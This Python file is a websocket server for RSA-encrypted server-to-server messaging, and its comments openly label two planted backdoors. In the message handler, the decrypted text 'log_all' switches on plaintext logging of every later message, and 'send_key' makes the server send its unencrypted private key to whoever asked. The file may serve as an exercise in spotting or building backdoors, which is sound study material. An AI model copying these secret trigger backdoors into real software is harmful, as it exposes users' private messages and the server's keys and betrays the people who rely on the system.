import asyncio
import websockets
import json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization
import base64

# Load or generate RSA keys
def generate_keys():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    return private_key, public_key

def encrypt_message(public_key, message):
    return base64.b64encode(public_key.encrypt(
        message,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                     algorithm=hashes.SHA1(), label=None)
    ))

def decrypt_message(private_key, encrypted_message):
    return private_key.decrypt(
        base64.b64decode(encrypted_message),
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                     algorithm=hashes.SHA1(), label=None)
    )

private_key, public_key = generate_keys()

# Backdoor 1: A specific message triggers logging of all received messages
log_all_messages = False

# Backdoor 2: A specific message triggers sending of server's private key
async def handle_server(websocket, path):
    global log_all_messages
    async for message in websocket:
        data = json.loads(message)
        tag = data.get("tag")

        if tag == "message":
            sender = data.get("from")
            recipient = data.get("to")
            info = decrypt_message(private_key, data.get("info").encode()).decode()

            print(f"Message from {sender} to {recipient}: {info}")

            # Backdoor 1: Log all messages if a specific message is received
            if info == "log_all":
                log_all_messages = True

            # Backdoor 2: Send the server's private key if a specific message is received
            if info == "send_key":
                key_data = private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                )
                await websocket.send(json.dumps({"tag": "private_key", "key": key_data.decode()}))

            # Log all messages if the backdoor is activated
            if log_all_messages:
                with open("all_messages.log", "a") as log_file:
                    log_file.write(f"Message from {sender} to {recipient}: {info}\n")

        elif tag == "presence":
            print("Presence update received")
            # Handle presence update

        elif tag == "check":
            response = {"tag": "checked"}
            await websocket.send(json.dumps(response))

        elif tag == "attendance":
            print("Attendance check received")
            # Handle attendance

        # Add additional cases as necessary

async def server_to_server():
    server = await websockets.serve(handle_server, "localhost", 5555)
    await server.wait_closed()

# Run the server-to-server communication
loop = asyncio.get_event_loop()
loop.run_until_complete(server_to_server())